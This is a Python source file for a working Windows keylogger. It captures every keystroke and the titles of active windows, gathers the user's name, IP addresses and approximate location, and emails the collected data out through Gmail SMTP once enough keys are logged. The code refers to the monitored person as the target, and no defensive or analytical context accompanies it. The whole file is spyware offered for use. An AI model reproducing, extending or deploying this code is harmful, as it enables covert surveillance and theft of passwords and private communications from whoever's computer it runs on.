import time
import win32gui
import getpass
import requests
import socket
import json
import smtplib
import threading
from typing import final
from pynput import keyboard
from requests.models import Response
from requests.sessions import PreparedRequest
from datetime import date
from datetime import datetime
from urllib.request import urlopen
from subprocess import call

call("pip install requests", shell=True)
call("pip install pynput", shell=True)
call("pip install pywin32", shell=True)


my_email =  # Enter your email here (as a string)
my_pass =  # Enter your email password here (as a string)


window_log = []
keys_pressed = []
current_window_logs = []


def log_window():
    try:
        the_current_window = str(win32gui.GetWindowText(
            win32gui.GetForegroundWindow()))
        if the_current_window == current_window_logs[-1] or the_current_window == "":
            pass
        else:
            current_window = win32gui.GetWindowText(
                win32gui.GetForegroundWindow())
            current_window_logs.append(str(current_window))
            username = getpass.getuser()
            today = date.today()
            current_date = today.strftime('%m/%d/%y')
            current_time = datetime.now()
            current_time = current_time.strftime("%I:%M:%S")
            date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'

            window_log.append(date_and_window)
    except IndexError:
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        current_window_logs.append(str(current_window))
        username = getpass.getuser()
        today = date.today()
        current_date = today.strftime('%m/%d/%y')
        current_time = datetime.now()
        current_time = current_time.strftime("%H:%M")
        date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'
        print('index error')
        window_log.append(date_and_window)


def keylogger():
    def check_keys():
        # The amount of seconds it takes to check the amount of keys pressed
        time_to_check_keys = 5
        # The amount of keys that need to be pressed to send the email
        amount_of_keys_to_be_pressed = 20

        time.sleep(time_to_check_keys)
        key_count_checker = []
        for i in keys_pressed:
            key_count_checker.append('s')
        if len(key_count_checker) < amount_of_keys_to_be_pressed:
            pass
        else:
            send_email()

    def thread_to_start_check_keys():
        while True:
            check_keys()

    def thread_for_window_logger():
        while True:
            log_window()

    def listen():
        def on_press(key):
            global keys_pressed

            try:
                if 'Key.' in str(key.char):
                    sub = str(key.char).split('Key.')[1]
                    if sub != 'space':
                        keys_pressed.append(f' [{sub}] ')
                    else:
                        keys_pressed.append(f' ')
                else:
                    keys_pressed.append(str(key.char))
            except AttributeError:
                if 'Key.' in str(key):
                    sub = str(key).split('Key.')[1]
                    if sub != 'space':
                        keys_pressed.append(f' [{sub}] ')
                    else:
                        keys_pressed.append(f' ')
                else:
                    keys_pressed.append(str(key))

        with keyboard.Listener(
                on_press=on_press) as listener:
            listener.join()

    threading.Thread(target=thread_to_start_check_keys).start()
    threading.Thread(target=thread_for_window_logger).start()
    listen()


def send_email():
    def get_target_info():
        global final_target_info
        global window_log
        global keys_pressed

        public_ip = requests.get('https://api.ipify.org').text
        private_ip = socket.gethostbyname(socket.gethostname())

        def get_location():
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)

            ip = data['ip']
            provider = data['org']
            city = data['city']
            country = data['country']
            state = data['region']
            location = f'Country: {country}\nState: {state}\nCity: {city}\nProvider: {provider}'

            return location

        window_log_to_send = '\n'.join(window_log)
        keys_pressed_to_send = ''.join(keys_pressed)
        final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\n{window_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
        keys_pressed_to_send = ''
        window_log_to_send = ''

    def compile_and_send_email():
        global window_log
        global keys_pressed

        email_message = final_target_info
        print(str(email_message))
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        email = my_email
        password = my_pass
        server.login(email, password)
        server.sendmail(email, email, str(
            email_message).encode("ascii", "ignore"))
        window_log = []
        keys_pressed = []
    get_target_info()
    compile_and_send_email()


keylogger()
